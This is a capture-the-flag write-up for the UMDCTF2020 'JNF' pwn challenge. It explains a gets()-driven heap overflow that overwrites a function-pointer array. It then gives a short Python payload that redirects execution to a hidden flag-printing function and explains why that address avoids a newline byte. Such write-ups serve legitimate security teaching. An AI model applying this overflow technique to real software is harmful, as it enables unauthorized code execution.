
## JNF
### Description

> We are trying to make a hyper jump to Naboo, but our system doesn't know where Naboo is. Can you help us figure out the issue?
>
> `nc 192.241.138.174 9996` 
>
> Author: `WittsEnd2`


### Attachment

[JNF](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/JNF/JNF)

### Analysis

### Heap overflow

```c
  nptr = malloc(0x42uLL);
  v8 = malloc(0x18uLL);
  *v8 = jumpToHoth;
  v8[1] = jumpToCoruscant;
  v8[2] = jumpToEndor;
// ......
  gets(nptr);
```

From the code, we can see `v8` is an array of function pointer and `nptr` is a buffer.

All of them created by `malloc` and in heap.

![](http://image.taqini.space/img/20200419151918.png)

Function pointer array `v8` will be overwrite with our input after 80 bytes.

### Hidden function

If we call the hidden function `jumpToNaboo` , we can get flag.

```c
int jumpToNaboo(){
  return puts("Jumping to Naboo...\n UMDCTF-{ flag on server             }");
}
```

```nasm
.text:000000000040070A jumpToNaboo     proc near
.text:000000000040070A                 push    rbp
.text:000000000040070B                 mov     rbp, rsp
.text:000000000040070E                 mov     edi, offset aJumpingToNaboo
.text:0000000000400713                 call    _puts
.text:0000000000400718                 nop
.text:0000000000400719                 pop     rbp
.text:000000000040071A                 retn
```

### Solution

Overwrite the first function pointer in array with address of `puts(flag)` in `jumpToNaboo` and call it:

```python
payload = '1' + 'A'*79
payload += p32(0x40070E)
ru('SYSTEM CONSOLE> ')
sl(payload)
```

#### Why 0x40070E?

Because the beginning address of  `jumpToNaboo` is `0x40070A`, and `\x0a` is termination code for `gets()` which causes early termination of our input.


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/JNF) 


